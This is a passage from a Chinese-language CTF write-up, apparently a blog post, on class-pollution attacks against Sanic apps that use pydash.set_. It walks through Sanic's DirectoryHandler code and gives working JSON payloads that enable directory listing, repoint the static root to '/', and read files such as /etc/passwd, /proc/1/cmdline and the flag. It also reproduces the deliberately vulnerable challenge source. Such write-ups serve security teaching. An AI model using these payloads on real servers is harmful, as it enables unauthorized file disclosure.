    if directory_handler and (directory_view or index):
        raise ValueError(
            &quot;When explicitly setting directory_handler, you cannot &quot;
            &quot;set either directory_view or index. Instead, pass &quot;
            &quot;these arguments to your DirectoryHandler instance.&quot;
        )

    if not directory_handler:
        directory_handler = DirectoryHandler(
            uri=uri,
            directory=file_or_directory,
            directory_view=directory_view,
            index=index,
        )

    static = FutureStatic(
        uri,
        file_or_directory,
        pattern,
        use_modified_since,
        use_content_range,
        stream_large_files,
        name,
        host,
        strict_slashes,
        content_type,
        resource_type,
        directory_handler,
    )
    self._future_statics.add(static)

    if apply:
        self._apply_static(static)
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​		注释里面存在这两句话：</span><br><span class="line"></span><br><span class="line">```tex</span><br><span class="line">            directory_view (bool, optional): Whether to fallback to showing</span><br><span class="line">                the directory viewer when exposing a directory. Defaults</span><br><span class="line">                to `False`.</span><br><span class="line">            directory_handler (Optional[DirectoryHandler], optional): An</span><br><span class="line">                instance of DirectoryHandler that can be used for explicitly</span><br><span class="line">                controlling and subclassing the behavior of the default</span><br><span class="line">                directory handler.</span><br></pre></td></tr></table></figure>
<p>​		大致意思就是 directory_view 为 True 时，会开启列目录功能，directory_handler 中可以获取指定的目录。跟进下 <code>directory_handler</code>  ，如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> directory_handler:</span><br><span class="line">    directory_handler = DirectoryHandler(</span><br><span class="line">        uri=uri,</span><br><span class="line">        directory=file_or_directory,</span><br><span class="line">        directory_view=directory_view,</span><br><span class="line">        index=index,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
<p>​		再跟进 <code>DirectoryHandler</code> ，发现如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        uri: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        directory: Path,</span></span><br><span class="line"><span class="params">        directory_view: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        index: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">Sequence</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br></pre></td></tr></table></figure>
<p>​		我们发现只要我们将 directory 污染为根目录，directory_view 污染为 True，就可以看到根目录的所有文件了。</p>
<p><strong>后续我在 Windows 上测试次次运行不了，这里就直接借一下大佬们的代码在这儿，我就不实操了</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="comment">#from sanic_session import Session</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"><span class="comment">#Session(app)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment">#async def index(request):</span></span><br><span class="line">    <span class="comment">#return html(open(&#x27;static/index.html&#x27;).read())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@app.route(&quot;/login&quot;)</span></span><br><span class="line"><span class="comment">#async def login(request):</span></span><br><span class="line">    <span class="comment">#user = request.cookies.get(&quot;user&quot;)</span></span><br><span class="line">    <span class="comment">#if user.lower() == &#x27;adm;n&#x27;:</span></span><br><span class="line">        <span class="comment">#request.ctx.session[&#x27;admin&#x27;] = True</span></span><br><span class="line">        <span class="comment">#return text(&quot;login success&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#return text(&quot;login fail&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">print</span>(app.router.name_index)</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(app.router.name_index[&#x27;name&#x27;].directory_view)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		输出应该接近这样：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/de66f739b68d4092a1c471efee8f4a6b.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		看出来了路由是  <code>&quot;__mp_main__.static&quot;</code> ，之后，就可以直接一把梭了（具体链子怎么找，参考 gxngxngxn 大佬的文章）：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		上面的 payload 是开启目录功能。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		这个 payload 是将指定目录污染为根目录，之后访问 /static/ 目录，就能看到根目录下开始的所有文件的文件名了 /</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/flag文件名字&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		这个 payload 是用来读 flag 文件的，之后访问 src 路由即可获得 flag。</p>
<h2 id="dasctf2024夏季挑战赛sanics-revenge"><a class="markdownIt-Anchor" href="#dasctf2024夏季挑战赛sanics-revenge">#</a> [DASCTF2024 夏季挑战赛] Sanic’s revenge</h2>
<p>​		题目给了个附件，下载下来直接开始审：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># 生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># 备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>​		一眼不丁真。这个感觉和之前打的题都不一样，因为之前的思路都是污染 <code>__file__</code> 属性，但是这一次似乎不是，并且，pollute 路由还过滤了 parts 和 proc 以及限制 value 不能是列表。</p>
<p>​		这个题我不是很能理解，感觉很逆天，考点主要的是 sanic 框架的漏洞题，先贴一下原理吧，虽然我也不是很明白。</p>
<p>​		首先是根基 static 函数，之后，之后跟进 <code>DirectoryHandler</code>  类，找到了如下两段：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">      current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(self.base) :].strip(<span class="string">&quot;/&quot;</span>)  <span class="comment"># noqa: E203</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self.directory_view:</span><br><span class="line">          <span class="keyword">return</span> self._index(</span><br><span class="line">              self.directory / current, path, request.app.debug</span><br><span class="line">          )</span><br></pre></td></tr></table></figure>
<p>​		当开启了目录功能后，就会进入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> self._index(</span><br><span class="line">             self.directory / current, path, request.app.debug</span><br><span class="line">         )</span><br></pre></td></tr></table></figure>
<p>​		这一点很重要，跟进 <code>_index</code>  看看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_index</span>(<span class="params">self, location: Path, path: <span class="built_in">str</span>, debug: <span class="built_in">bool</span></span>):</span><br><span class="line">    <span class="comment"># Remove empty path elements, append slash</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;//&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="keyword">not</span> path.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(</span><br><span class="line">            <span class="string">&quot;/&quot;</span> + <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;<span class="subst">&#123;p&#125;</span>/&quot;</span> <span class="keyword">for</span> p <span class="keyword">in</span> path.split(<span class="string">&quot;/&quot;</span>) <span class="keyword">if</span> p])</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Render file browser</span></span><br><span class="line">    page = DirectoryPage(self._iter_files(location), path, debug)</span><br><span class="line">    <span class="keyword">return</span> html(page.render())</span><br></pre></td></tr></table></figure>
<p>​		很显然， <code>_index</code>  是一个拼接函数，主要是为了拼接目录的。根据下面这一行，我们又有了可以操作的空间了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(self.base) :].strip(<span class="string">&quot;/&quot;</span>)  <span class="comment"># noqa: E203</span></span><br></pre></td></tr></table></figure>
<p>​		发现了啥？这里 path 在被分割的时候有个情况，就是将路径从 base 字符串结尾开始的所有字符串去掉头尾的 <code>'/'</code>  字符后返回，也就是说，当我们把 base 属性污染成指定的字符串之后，后面如果出现了两个点，也就是 <code>..</code>  就说明了 current 返回的字符串可能存在路径穿越。</p>
<p>​		好了， 再回来看看这个题，首先，最好应该先获取完整的源代码，所以这里可以像之前的题一样污染 <code>directory_view</code>  属性打开静态文件目录。payload 如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#这个payload不知道为啥访问static目录的时候感觉没啥变化，但是如果加上了像什么/static/etc/passwd之类的文件却能访问到</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://i-blog.csdnimg.cn/direct/d67ac7ea195d460b8d80bdeb0f7d00a9.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		既然能成，那正常访问 <code>/static/proc/1/cmdline</code> ，发现了重要的东西，就是</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash  /start.sh</span><br></pre></td></tr></table></figure>
<p>​		访问 <code> /static/start.sh</code>  之后获得信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [[ -f /flag.sh ]]; then</span><br><span class="line">	source /flag.sh</span><br><span class="line">	rm -f /flag.sh</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">python3 /app/2Q17A58T9F65y5i8.py</span><br></pre></td></tr></table></figure>
<p>​		找到了文件名了，读取 <code>/static/app/2Q17A58T9F65y5i8.py</code>  看看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_log_dir</span>(<span class="params">n</span>):</span><br><span class="line">        ret = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">            letter = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">            Letter = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">            s = <span class="built_in">str</span>(random.choice([num, letter, Letter]))</span><br><span class="line">            ret += s</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">        </span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line">   </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment">#方便管理员查看非法日志</span></span><br><span class="line">    log_dir=os.popen(<span class="string">&#x27;ls /tmp -al&#x27;</span>).read();</span><br><span class="line">    <span class="keyword">return</span> text(log_dir)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span 